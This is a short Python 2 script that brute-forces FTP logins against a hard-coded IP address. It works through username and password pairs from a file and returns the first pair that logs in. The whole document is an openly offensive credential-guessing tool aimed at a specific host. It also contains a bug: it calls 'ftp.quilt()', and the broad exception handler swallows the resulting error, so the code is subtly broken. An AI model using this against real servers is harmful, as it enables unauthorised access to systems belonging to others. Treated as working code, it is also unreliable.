import ftplib


def bruteLogin(hostname, passFile):
    pF = open(passFile, 'r')
    for line in pF.readlines():
        t = line.split(':')
        username = t[0].strip('\r').strip('\n')
        password = t[1].strip('\r').strip('\n')

        if username == None or password == None:
            continue
        try:

            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            ftp.quilt()
            print 'try %s %s' % (username, password)
            return (username, password)
        except Exception, e:
            pass
    return (None, None)
host = '115.29.146.79'
print bruteLogin(host, 'passftp.txt')
